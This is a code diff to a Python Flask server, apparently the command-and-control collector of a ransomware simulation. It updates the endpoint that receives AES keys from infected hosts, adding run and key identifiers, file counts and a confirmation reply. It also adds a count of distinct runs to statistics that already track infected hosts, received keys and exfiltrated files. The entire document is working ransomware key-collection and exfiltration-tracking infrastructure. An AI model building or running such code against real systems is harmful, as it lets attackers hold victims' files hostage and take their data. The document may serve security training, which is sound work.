@@ -84,20 +84,40 @@ def collect():
     `session_token`, para tolerar a variação lexical dos cenários sanitizados.
 
     Payload esperado:
-        {"hostname": "DESKTOP-XYZ", "aes_key": "<base64>"}
+        {"run_id": "run-1", "key_id": "key-1", "hostname": "DESKTOP-XYZ",
+         "aes_key": "<base64>", "file_count": 3}
+
+    A resposta 200 com `confirmed: true` e o `event_id`/`key_id`/`run_id` e a
+    confirmacao que o coletor exige antes de qualquer processamento posterior.
     """
     try:
         payload = request.get_json(force=True, silent=True) or {}
         hostname = payload.get("hostname", "unknown")
         aes_key  = payload.get("aes_key") or payload.get("session_token") or "N/A"
+        run_id   = payload.get("run_id", "run-unknown")
+        key_id   = payload.get("key_id", "key-1")
+        try:
+            file_count = int(payload.get("file_count", 0))
+        except (TypeError, ValueError):
+            file_count = 0
 
         event = _register("KEY_RECEIVED", {
-            "hostname": hostname,
-            "aes_key":  aes_key,
-            "key_len":  len(aes_key),
+            "run_id":     run_id,
+            "key_id":     key_id,
+            "hostname":   hostname,
+            "aes_key":    aes_key,
+            "key_len":    len(aes_key),
+            "file_count": file_count,
+            "confirmed":  True,
         })
 
-        return jsonify({"status": "ok", "event_id": event["id"]}), 200
+        return jsonify({
+            "status":    "ok",
+            "confirmed": True,
+            "event_id":  event["id"],
+            "run_id":    run_id,
+            "key_id":    key_id,
+        }), 200
 
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
@@ -158,12 +178,14 @@ def api_stats():
     chaves_recebidas = [e for e in _events if e["type"] == "KEY_RECEIVED"]
     arquivos_exfil   = [e for e in _events if e["type"] == "FILE_EXFILTRATED"]
     heartbeats       = [e for e in _events if e["type"] == "HEARTBEAT"]
+    runs_distintos   = {e.get("run_id", "run-unknown") for e in chaves_recebidas}
 
     return jsonify({
         "total_eventos":       len(_events),
         "hosts_infectados":    len(hosts_infectados),
         "lista_hosts":         list(hosts_infectados),
         "chaves_recebidas":    len(chaves_recebidas),
+        "runs_distintos":      len(runs_distintos),
         "arquivos_exfiltrados": len(arquivos_exfil),
         "heartbeats":          len(heartbeats),
         "primeiro_evento":     _events[0]["timestamp"]  if _events else None,
